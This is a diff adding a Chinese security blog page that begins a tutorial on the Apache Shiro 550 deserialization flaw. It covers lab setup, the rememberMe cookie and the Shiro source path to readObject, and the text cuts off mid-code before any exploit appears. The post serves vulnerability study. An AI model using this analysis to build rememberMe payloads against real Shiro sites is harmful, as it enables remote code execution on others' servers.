@@ -1,0 +1,1553 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head><!-- hexo injector head_begin start --><progress id="content_progress" value="0"></progress><!-- hexo injector head_begin end -->
+  <meta charset="UTF-8">
+  
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/pig.png">
+  <link rel="icon" href="/img/pig.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#3F4B3B">
+  <meta name="author" content="Piggy Sprint">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Shiro550反序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro550反序列化">
+<meta property="og:url" content="http://example.com/2025/12/11/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88Shiro550%EF%BC%89/index.html">
+<meta property="og:site_name" content="Piggy Sprint&#39;s blog">
+<meta property="og:description" content="Shiro550反序列化">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208193509179.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208193632624.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208194301212.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208194832557.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208195020470.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208195711355.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208200158208.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208200931877.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208204428608.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208204851761.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208205025126.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208205048022.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208205222240.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210124308886.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251209205242557.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210124210310.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210124219723.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210124607818.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210143247024.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210144233946.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210145029408.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210145630056.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210211605647.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210212046329.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210150706083.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210151727530.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210152336528.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210153902957.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210215858809.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210220322441.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210223641183.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210223650249.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210223705417.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210223716153.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210223752013.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210223816499.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210223820400.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210223920367.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251210223925918.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251211110851854.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251211111139737.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251211111246057.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251211112206569.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251211113511046.png">
+<meta property="article:published_time" content="2025-12-11T12:00:00.000Z">
+<meta property="article:modified_time" content="2025-12-11T05:43:33.030Z">
+<meta property="article:author" content="Piggy Sprint">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="Shiro550">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208193509179.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Shiro550反序列化 - Piggy Sprint&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+
+
+  
+<link rel="stylesheet" href="/custom/LoadingBar/pace-theme-barber-shop.css">
+<link rel="stylesheet" href="/css/cloudedGlass.css">
+<link rel="stylesheet" href="/custom/ReadingProgress/ReadingProgress.css">
+<link rel="stylesheet" href="/css/Loadanimation.css">
+<link rel="stylesheet" href="/css/StrongInDark.css">
+<link rel="stylesheet" href="/css/TitleNeon.css">
+<link rel="stylesheet" href="/css/TitleGradient.css">
+<link rel="stylesheet" href="/css/ScrollBar.css">
+<link rel="stylesheet" href="https://lib.baomitu.com/font-awesome/6.1.2/css/all.min.css">
+<link rel="stylesheet" href="/css/CodeBlock.css">
+<link rel="stylesheet" href="/css/CodeInLine.css">
+<link rel="stylesheet" href="/css/RandomBanner.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+<link rel="stylesheet" href="/css/Background.css">
+<link rel="stylesheet" href="/css/FrostedGlassBg.css">
+<link rel="stylesheet" href="/css/Sidebar.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":false,"default":"TEXT"},"copy_btn":false,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"7H0Tkmd6gbla1cOeZ7rS44zF-gzGzoHsz","app_key":"byZ7eSN7DH9MXIyDyXwXE8SE","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+  <script src="/js/backgroundize.js"></script>
+  <script src="/js/injector.js"></script>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.css">
+<style>:root{--hl-color:#abb2bf;--hl-bg:#282c34;--hltools-bg:#21252b;--hltools-color:#bbbbbc;--hlnumber-bg:#282c34;--hlnumber-color:#495162;--hlscrollbar-bg:#373c47;--hlexpand-bg:linear-gradient(180deg,rgba(40,44,52,0.1),rgba(40,44,52,0.9))}</style>
+    <style>
+    .code-expand-btn:not(.expand-done) ~ div.codeblock,
+    .code-expand-btn:not(.expand-done) ~ * div.codeblock {
+      overflow: hidden;
+      height: 360px;
+    }
+    </style>
+  <!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  <div id="loader-container"> 
+    <div id="loader" class="loader"></div>
+    <div class="loader-inner">
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+    </div>
+</div>
+
+<script src="/js/RainbowLoading.js" type="text/javascript"></script>
+<link href="/css/RainbowLoading.css" type="text/css" rel="stylesheet"/>
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title"> 🐽🐽 Piggy Sprint &#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/banner/random.webp') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Shiro550反序列化"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-12-11 20:00" pubdate>
+          2025年12月11日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          27 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Shiro550反序列化</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Shiro550"><a href="#Shiro550" class="headerlink" title="Shiro550"></a>Shiro550</h1><blockquote>
+<p>550的话是由于他的密钥是固定的，是可以爆破的，经过Base64和AES解密以后，可以将里面的内容构造为恶意代码，从而达到RCE的目的</p>
+</blockquote>
+<p>主要是这三部分：URLDNS验证，CC，CB</p>
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>要么看这篇搭建[<a target="_blank" rel="noopener" href="https://changxia3.com/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/">Shiro反序列化漏洞笔记一（原理篇）</a></p>
+<p>要么如下搭建：</p>
+<ul>
+<li><p>idea打开源码</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings/tree/master">https://github.com/phith0n/JavaThings/tree/master</a></p>
+</li>
+<li><p>启动tomcat</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208193509179.png" srcset="/img/loading.gif" lazyload alt="image-20251208193509036"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208193632624.png" srcset="/img/loading.gif" lazyload alt="image-20251208193632580"></p>
+<p>加上这俩</p>
+</li>
+<li><p>启动</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208194301212.png" srcset="/img/loading.gif" lazyload alt="image-20251208194301114"></p>
+<p>账号密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208194832557.png" srcset="/img/loading.gif" lazyload alt="image-20251208194832533"></p>
+</li>
+</ul>
+<h1 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h1><ul>
+<li><p>在登录界面有remember me的选项，勾选后点击登录抓包</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208195020470.png" srcset="/img/loading.gif" lazyload alt="image-20251208195020390"></p>
+<p>下次访问直接就进去了</p>
+</li>
+<li><p><code>rememberMe=</code>这么一大坨（一般的cookic比较短），里面一定是有隐藏信息的（序列化反序列化的信息），接下来看看源码</p>
+</li>
+</ul>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul>
+<li><p>找到一个类<code>CookieRememberMeManager.java</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208195711355.png" srcset="/img/loading.gif" lazyload alt="image-20251208195658294"></p>
+</li>
+<li><p>这个方法中<code>getRememberedSerializedIdentity</code>，在这个地方，将数据包中的<code>cookie</code>取出来进行<code>base64</code>解码，后返回解码的东西</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208200158208.png" srcset="/img/loading.gif" lazyload alt="image-20251208200158116"></p>
+</li>
+<li><p>看看谁调用了<code>getRememberedSerializedIdentity</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251208200931877.png" srcset="/img/loading.gif" lazyload alt="image-20251208200931815"></p>
+<p><code>AbstractRememberMeManager</code>类的<code>getRememberedPrincipals</code>方法调用</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">PrincipalCollection</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">getRememberedPrincipals</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">SubjectContext</span><span style="color: #E06C75"> subjectContext) {</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">PrincipalCollection</span><span style="color: #E06C75"> principals </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">try</span><span style="color: #E06C75"> {</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] bytes </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getRememberedSerializedIdentity</span><span style="color: #ABB2BF">(subjectContext);</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (bytes </span><span style="color: #56B6C2">!=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">bytes</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #E06C75">) {</span></span>
+<span class="line"><span style="color: #E06C75">            principals </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">convertBytesToPrincipals</span><span style="color: #ABB2BF">(bytes, subjectContext);</span></span>
+<span class="line"><span style="color: #E06C75">        }</span></span>
+<span class="line"><span style="color: #E06C75">    } </span><span style="color: #C678DD">catch</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">RuntimeException</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">re</span><span style="color: #E06C75">) {</span></span>
+<span class="line"><span style="color: #E06C75">        principals </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">onRememberedPrincipalFailure</span><span style="color: #ABB2BF">(re, subjectContext);</span></span>
+<span class="line"><span style="color: #E06C75">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> principals</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure>
+</li>
+<li><p>将解码出来的字节，放入<code>convertBytesToPrincipals</code>方法中</p>
+<p>跟进看看</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">protected</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">PrincipalCollection</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">convertBytesToPrincipals</span><span style="color: #E06C75">(</span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] bytes</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">SubjectContext</span><span style="color: #E06C75"> subjectContext) {</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #61AFEF">getCipherService</span><span style="color: #E06C75">() </span><span style="color: #56B6C2">!=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75">) {</span></span>
+<span class="line"><span style="color: #E06C75">        bytes </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">decrypt</span><span style="color: #E06C75">(bytes)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    }</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">deserialize</span><span style="color: #E06C75">(bytes)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure>
+
+<p><strong>解密+反序列化</strong></p>
+<p>对所传入的字节进行一个<strong>解密</strong>，然后将<strong>反序列化</strong>后的它返回了回去</p>
+<ul>
+<li><p>反序列化的具体调用</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">T</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">deserialize</span><span style="color: #E06C75">(</span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] serialized) throws SerializationException {</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (serialized </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75">) {</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> msg </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;argument cannot be null.&quot;</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">throw</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">IllegalArgumentException</span><span style="color: #E06C75">(msg)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    }</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">ByteArrayInputStream</span><span style="color: #E06C75"> bais </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">ByteArrayInputStream</span><span style="color: #E06C75">(serialized)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">BufferedInputStream</span><span style="color: #E06C75"> bis </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">BufferedInputStream</span><span style="color: #E06C75">(bais)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">try</span><span style="color: #E06C75"> {</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">ObjectInputStream</span><span style="color: #E06C75"> ois </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">ClassResolvingObjectInputStream</span><span style="color: #E06C75">(bis)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">SuppressWarnings</span><span style="color: #E06C75">({</span><span style="color: #98C379">&quot;unchecked&quot;</span><span style="color: #E06C75">})</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">T</span><span style="color: #E06C75"> deserialized </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (T) </span><span style="color: #E5C07B">ois</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">readObject</span><span style="color: #ABB2BF">();</span><span style="color: #E06C75">  </span><span style="color: #7F848E; font-style: italic">//调用反序列化</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">ois</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">close</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> deserialized</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    } </span><span style="color: #C678DD">catch</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">Exception</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #E06C75">) {</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> msg </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;Unable to deserialze argument byte array.&quot;</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">throw</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">SerializationException</span><span style="color: #E06C75">(msg</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> e)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    }</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure>
+
+<p>反序列化也是调用了原生的<code>readObject</code></p>
+<p>如果说它带了cc的依赖，我们就可以打它的cc依赖（得看maven）</p>
+<p><strong>反序列化的点就在<code>convertBytesToPrincipals</code>中</strong></p>
+</li>
+<li><p>解密</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">protected</span><span style="color: #E06C75"> </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] </span><span style="color: #61AFEF">decrypt</span><span style="color: #E06C75">(</span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] encrypted) {</span></span>
